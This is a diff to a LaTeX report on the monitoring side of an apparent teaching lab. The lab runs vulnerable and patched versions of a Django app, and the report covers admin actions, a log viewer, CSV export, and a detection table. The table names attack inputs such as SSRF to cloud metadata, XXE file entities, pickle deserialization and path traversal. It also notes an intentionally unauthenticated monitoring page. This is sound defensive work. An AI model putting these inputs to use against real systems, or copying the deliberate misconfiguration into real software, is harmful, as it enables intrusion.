+    # Check if admin is revoking their own session
+    current_ip = request.META.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip()
+    if not current_ip:
+        current_ip = request.META.get('REMOTE_ADDR', '')
+    
+    if current_ip == log.ip_address:
+        # Revoke current session
+        request.session.flush()
+        redirect_url = '/patched/login/' if 'patched' in log.endpoint else '/vulnerable/login/'
+        message = 'Your session has been revoked. Redirecting to login...'
+        should_redirect = True
+    else:
+        # Mark session as revoked (in production, delete from session store)
+        redirect_url = None
+        message = f'Session marked as revoked for IP {log.ip_address}'
+        should_redirect = False
+    
+    # Update log
+    log.action_taken = 'SESSION_REVOKED'
+    log.save()
+    
+    response = {'status': 'success', 'message': message}
+    if should_redirect:
+        response['redirect'] = redirect_url
+    
+    return JsonResponse(response)
+\end{lstlisting}
+
+\textbf{Smart Behavior:}
+\begin{itemize}[leftmargin=*]
+    \item If admin revokes their own session: Immediate logout and redirect
+    \item If revoking another user: Log marked, no self-logout
+    \item In production: Would query session store and delete by IP
+\end{itemize}
+
+\subsubsection{Log Resolution}
+
+Mark attacks as investigated and resolved:
+
+\begin{lstlisting}[language=Python]
+def resolve_log_action(request, log_id):
+    """Mark attack log as resolved with admin notes (Admin only)"""
+    user = request.session.get('user', {})
+    if not user.get('is_admin'):
+        return JsonResponse({'status': 'error', 'message': 'Unauthorized'}, status=403)
+    
+    log = get_object_or_404(AttackLog, id=log_id)
+    
+    # Get admin notes from request
+    admin_notes = request.GET.get('notes', '')
+    admin_user = user.get('username', 'manual_admin')
+    
+    # Mark as resolved
+    log.mark_resolved(admin_user, admin_notes)
+    log.action_taken = 'REVIEWED'
+    log.save()
+    
+    return JsonResponse({'status': 'success', 'message': 'Log marked as resolved'})
+\end{lstlisting}
+
+\subsection{Log Viewer Dashboard}
+
+\subsubsection{Filtering \& Statistics}
+
+The monitoring dashboard displays attack logs with filtering capabilities:
+
+\begin{lstlisting}[language=Python]
+def log_viewer(request, filter_path=None):
+    """Display attack logs with severity, actions, and statistics"""
+    
+    # ACCESS CONTROL: Patched version requires admin
+    if filter_path == 'patched':
+        user = request.session.get('user', {})
+        if not user.get('is_admin'):
+            return HttpResponse("Access Denied: Admin privileges required", status=403)
+    
+    # Apply filters
+    severity_filter = request.GET.get('severity', '')
+    action_filter = request.GET.get('action', '')
+    resolved_filter = request.GET.get('resolved', '')
+    
+    # Build queryset
+    if filter_path:
+        logs = AttackLog.objects.filter(
+            endpoint__startswith=f'/{filter_path}/'
+        ).order_by('-timestamp')
+    else:
+        logs = AttackLog.objects.all().order_by('-timestamp')
+    
+    # Apply filters
+    if severity_filter:
+        logs = logs.filter(severity=severity_filter)
+    if action_filter:
+        logs = logs.filter(action_taken=action_filter)
+    if resolved_filter == 'yes':
+        logs = logs.filter(is_resolved=True)
+    elif resolved_filter == 'no':
+        logs = logs.filter(is_resolved=False)
+    
+    # Calculate statistics
+    stats = {
+        'total_logs': logs.count(),
+        'critical_count': AttackLog.objects.filter(severity='CRITICAL').count(),
+        'high_count': AttackLog.objects.filter(severity='HIGH').count(),
+        'unresolved_count': AttackLog.objects.filter(is_resolved=False).count(),
+        'blocked_ips_count': BlockedIP.objects.filter(is_permanent=False).count(),
+    }
+    
+    # Get blocked IPs
+    blocked_ips = BlockedIP.objects.all().order_by('-blocked_at')[:20]
+    
+    context = {
+        'logs': logs[:100],  # Limit to 100 for performance
+        'blocked_ips': blocked_ips,
+        'filter_path': filter_path,
+        **stats
+    }
+    
+    return render(request, 'monitoring/logs.html', context)
+\end{lstlisting}
+
+\subsubsection{CSV Export}
+
+Export logs for external analysis:
+
+\begin{lstlisting}[language=Python]
+def export_logs(request):
+    """Export attack logs to CSV (Admin only)"""
+    user = request.session.get('user', {})
+    if not user.get('is_admin'):
+        return HttpResponse("Access Denied", status=403)
+    
+    response = HttpResponse(content_type='text/csv')
+    response['Content-Disposition'] = 'attachment; filename="attack_logs.csv"'
+    
+    writer = csv.writer(response)
+    writer.writerow(['Timestamp', 'IP Address', 'Endpoint', 'Attack Type', 
+                     'Severity', 'Recommended Action', 'Action Taken', 
+                     'Is Resolved', 'Admin Notes'])
+    
+    logs = AttackLog.objects.all().order_by('-timestamp')
+    for log in logs:
+        writer.writerow([
+            log.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
+            log.ip_address,
+            log.endpoint,
+            log.attack_type,
+            log.severity,
+            log.recommended_action,
+            log.action_taken,
+            'Yes' if log.is_resolved else 'No',
+            log.admin_notes or ''
+        ])
+    
+    return response
+\end{lstlisting}
+
+\subsection{Detection Coverage Summary}
+
+\begin{table}[h]
+\centering
+\small
+\begin{tabular}{|p{3cm}|p{5cm}|p{2cm}|p{2cm}|}
+\hline
+\textbf{Attack Type} & \textbf{Detection Pattern} & \textbf{Severity} & \textbf{Endpoints} \\
+\hline
+Authentication Bypass & \texttt{is\_admin=true|is\_superuser=} & CRITICAL & /login/ \\
+\hline
+Brute Force & 7+ attempts/min (HIGH), 10+ (CRITICAL) & HIGH/CRITICAL & /login/ \\
+\hline
+SQL Injection & \texttt{connector=OR|name\_\_icontains=NUCLEAR} & CRITICAL & /dashboard/, /maintenance/ \\
+\hline
+Privilege Escalation & \texttt{is\_admin=true} in dashboard/maintenance & CRITICAL & /dashboard/, /maintenance/ \\
+\hline
+XXE Attack & \texttt{<!ENTITY|SYSTEM file://} & HIGH & /upload/ \\
+\hline
+Dangerous File Upload & \texttt{.php|.exe|.sh|.py|.bat} & HIGH & /upload/ \\
+\hline
+Path Traversal & \texttt{../} in filename & HIGH & /upload/ \\
+\hline
+IDOR & Access to admin reports (ID 1-10) & HIGH & /report/ \\
+\hline
+SSRF - Internal & \texttt{localhost|127.0.0.1|192.168.*} & HIGH & /ssrf/ \\
+\hline
+SSRF - Metadata & \texttt{169.254.169.254|metadata.google} & CRITICAL & /ssrf/ \\
+\hline
+Deserialization & \texttt{pickle|\_\_reduce\_\_|os.system} & CRITICAL & /deserialize/ \\
+\hline
+Cookie Manipulation & Invalid session format/length & HIGH & All endpoints \\
+\hline
+Directory Scanning & 20+ 404 errors in 10 minutes & MEDIUM & All endpoints \\
+\hline
+\end{tabular}
+\caption{Complete Attack Detection Coverage}
+\end{table}
 
 \subsection{False Positive Prevention}
 
-To minimize false positives:
+To minimize false alarms:
+
 \begin{itemize}[leftmargin=*]
-    \item Endpoint-specific detection (e.g., only check for XXE in upload endpoints)
-    \item Content-based analysis (check request body, not just URL)
-    \item Whitelist approach for normal operations (PDF uploads don't trigger alerts)
-    \item Separate logging for vulnerable and patched versions
-    \item Brute force threshold (5 attempts, not 1-2)
-    \item Directory scanning threshold (20 404s, not occasional mistyped URLs)
+    \item \textbf{Endpoint-Specific Detection:} XXE only checked on \texttt{/upload/}, SSRF only on \texttt{/ssrf/}
+    \item \textbf{Content-Based Analysis:} Checks both URL and request body for comprehensive coverage
+    \item \textbf{Threshold-Based Alerts:} Brute force requires 7+ attempts, directory scanning 20+ 404s
+    \item \textbf{Whitelist Approach:} PDF uploads don't trigger alerts, only executable extensions
+    \item \textbf{Case-Insensitive Regex:} Catches evasion attempts (IS\_ADMIN=TRUE, Is\_Admin=1)
+    \item \textbf{Separate Logging:} Vulnerable and patched versions logged independently
 \end{itemize}
 
-\subsection{Log Viewer}
+\subsection{Access Control}
 
-Monitoring logs are accessible at:
 \begin{itemize}[leftmargin=*]
-    \item \texttt{/monitoring/} - Shows attacks on vulnerable version
-    \item \texttt{/monitoring/patched/} - Shows attacks on patched version
+    \item \textbf{Vulnerable Version:} \texttt{/monitoring/} - No authentication required (security misconfiguration)
+    \item \textbf{Patched Version:} \texttt{/monitoring/patched/} - Admin authentication required
+    \item \textbf{Admin Actions:} Block IP, Revoke Session, Resolve Log - All require admin privileges
+    \item \textbf{CSV Export:} Admin-only feature
 \end{itemize}
 
-Each log entry displays:
-\begin{itemize}[leftmargin=*]
-    \item Timestamp
-    \item Severity badge (color-coded: CRITICAL=red, HIGH=orange, MEDIUM=blue, LOW=gray)
-    \item Attack type classification
-    \item Target endpoint
-    \item Attacker IP address
-    \item Recommended action
-    \item Action buttons (Block IP / Revoke Session / Resolve)
-    \item Resolution status and admin notes
-    \item Payload details (truncated to 500 characters)
-\end{itemize}
+
 
 The interface includes filtering by severity, action taken, and resolution status.
 
